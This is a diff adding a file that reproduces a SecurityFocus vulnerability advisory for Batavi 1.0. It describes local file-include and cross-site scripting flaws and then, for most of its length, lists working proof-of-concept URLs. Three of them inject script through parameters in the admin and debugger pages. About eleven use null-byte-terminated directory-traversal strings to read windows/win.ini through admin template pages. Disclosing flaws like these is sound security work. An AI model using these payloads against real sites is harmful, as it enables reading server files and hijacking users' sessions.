@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/46467/info
+
+Batavi is prone to multiple local file-include and cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker can exploit the local file-include vulnerabilities using directory-traversal strings to view and execute local files within the context of the affected application. Information harvested may aid in further attacks.
+
+The attacker may leverage the cross-site scripting issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.
+
+Batavi 1.0 is vulnerable; other versions may also be affected. 
+
+Cross site scripting:
+
+http://www.example.com/batavi/ext/xmlrpc/debugger/controller.php?action=&altmethodpayload=&#039;;}alert(0);{// http://www.example.com/batavi/admin/templates/pages/event_manager/edit.php?mID=%3C/script%3E%3Chtml%3E%3Cscript%3Ealert(0);%3C/script%3E%3C/html%3E http://www.example.com/batavi/admin/ext/color_picker/default.php?store_root=%22%3E%3C/script%3E%3Cscript%3Ealert(0)%3C%2fscript%3E
+
+Local file include:
+
+http://www.example.com/batavi/admin/templates/pages/templates_boxes/info.php?module=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini%00 http://www.example.com/batavi/admin/templates/pages/templates/batch_delete.php?template=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini%00 http://www.example.com/batavi/admin/templates/pages/templates/delete_rule.php?template=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini%00 http://www.example.com/batavi/admin/templates/pages/templates/edit.php?template=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini%00 http://www.example.com/batavi/admin/templates/pages/templates/edit_rule.php?template=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini%00 http://www.example.com/batavi/admin/templates/pages/templates/info.php?template=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini%00 http://www.example.com/batavi/admin/templates/pages/templates/uninstall.php?template=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini%00 http://www.example.com/batavi/admin/templates/pages/images/main.php?module=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini%00 http://www.example.com/batavi/admin/templates/pages/statistics/main.php?module=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini%00 http://www.example.com/batavi/admin/templates/pages/export/download.php?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini http://www.example.com/batavi/admin/templates/pages/page_layout/main.php?filter=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini%00
